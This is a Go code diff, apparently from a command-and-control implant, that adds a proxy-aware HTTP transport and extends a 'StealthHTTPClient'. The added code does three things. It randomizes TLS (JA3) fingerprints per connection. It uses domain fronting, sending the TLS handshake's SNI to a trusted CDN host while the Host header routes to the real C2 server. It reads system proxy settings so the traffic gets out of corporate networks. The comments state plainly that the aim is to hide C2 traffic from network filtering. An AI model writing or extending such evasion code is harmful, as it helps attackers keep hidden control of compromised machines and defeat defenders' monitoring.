@@ -51,18 +51,35 @@ func RandomTLSConfig() *tls.Config {
 	}
 }
 
-// StealthHTTPClient creates an HTTP client with JA3 randomization
-// and randomized User-Agent for each connection.
+// ProxyAwareTransport returns an http.Transport that honours system proxy settings.
+// On Windows this reads WinHTTP/IE proxy config via the registry; on Linux/macOS
+// it reads HTTP_PROXY, HTTPS_PROXY, and NO_PROXY environment variables.
+// If FrontDomain is set, the TLS ServerName is overridden for domain fronting —
+// the TLS handshake SNI goes to the CDN host while the HTTP Host header routes
+// to the actual C2 (set separately in sendEnvelope via HostHeader).
+func ProxyAwareTransport() *http.Transport {
+	tlsCfg := RandomTLSConfig()
+	if FrontDomain != "" {
+		// Domain fronting: SNI goes to the trusted CDN domain so network-layer
+		// filtering sees a connection to e.g. cdn.microsoft.com, not the C2.
+		tlsCfg.ServerName = FrontDomain
+		tlsCfg.InsecureSkipVerify = false // Verify the CDN's real cert
+	}
+	return &http.Transport{
+		TLSClientConfig:   tlsCfg,
+		Proxy:             http.ProxyFromEnvironment, // reads HTTP(S)_PROXY env + Windows registry
+		MaxIdleConns:      1,
+		IdleConnTimeout:   30 * time.Second,
+		DisableKeepAlives: true, // New connection each time = new JA3
+	}
+}
+
+// StealthHTTPClient creates an HTTP client with JA3 randomization,
+// proxy-awareness, and optional domain fronting.
 func StealthHTTPClient() *http.Client {
 	return &http.Client{
-		Timeout: 30 * time.Second,
-		Transport: &http.Transport{
-			TLSClientConfig:     RandomTLSConfig(),
-			MaxIdleConns:        1,
-			IdleConnTimeout:     30 * time.Second,
-			DisableKeepAlives:   true, // New connection each time = new JA3
-			ForceAttemptHTTP2:   false,
-		},
+		Timeout:   30 * time.Second,
+		Transport: ProxyAwareTransport(),
 	}
 }
 
